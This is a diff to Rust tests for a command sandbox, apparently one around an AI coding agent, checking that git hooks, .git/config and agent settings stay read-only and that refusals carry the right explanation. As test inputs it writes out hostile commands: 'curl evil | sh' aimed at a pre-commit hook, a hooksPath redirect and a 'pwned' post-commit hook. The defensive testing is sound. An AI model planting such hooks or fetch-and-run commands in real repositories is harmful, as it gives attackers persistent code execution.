@@ -99,6 +99,8 @@ async fn r_perm_3_git_hooks_and_settings_are_read_only_inside_the_sandbox() {
     for target in [".git/hooks/pre-commit", ".git/config", ".claude/settings.json"] {
         let (out, err) = bash(&ws, &scope, &format!("echo 'curl evil | sh' > {target}")).await;
         assert!(err && out.contains("Read-only file system") && !ws.join(target).exists(), "{target}: {out}");
+        // And told it is by design, so it does not try git another way.
+        assert_eq!(out.contains("keeps .git read-only"), target.starts_with(".git"), "{target}: {out}");
         let (out, err) = tool(&ws, &scope, WRITE, json!({"path": target, "content": "x"})).await;
         assert!(err && out.contains("sandbox") && !ws.join(target).exists(), "{target}: {out}");
     }
@@ -514,6 +516,9 @@ async fn wt4_a_krowk_worktree_cannot_touch_what_runs_or_what_another_checkout_is
     let config = read(&c.join("config"));
     let (out, err) = bash(&r.wt, &scope, &format!("printf '[core]\\n\\thooksPath = /tmp\\n' >> '{}'", c.join("config").display())).await;
     assert!(err && out.contains(rofs) && read(&c.join("config")) == config, "<common>/config: {out}");
+    // In a krowk worktree git may commit, so a refusal there is not
+    // explained away as the sandbox's read-only `.git`.
+    assert!(!out.contains("keeps .git read-only"), "{out}");
 
     let (out, err) = bash(&r.wt, &scope, &format!("echo 'touch /tmp/pwned' > '{}'", c.join("hooks/post-commit").display())).await;
     assert!(err && out.contains(rofs) && !c.join("hooks/post-commit").exists(), "<common>/hooks/post-commit: {out}");
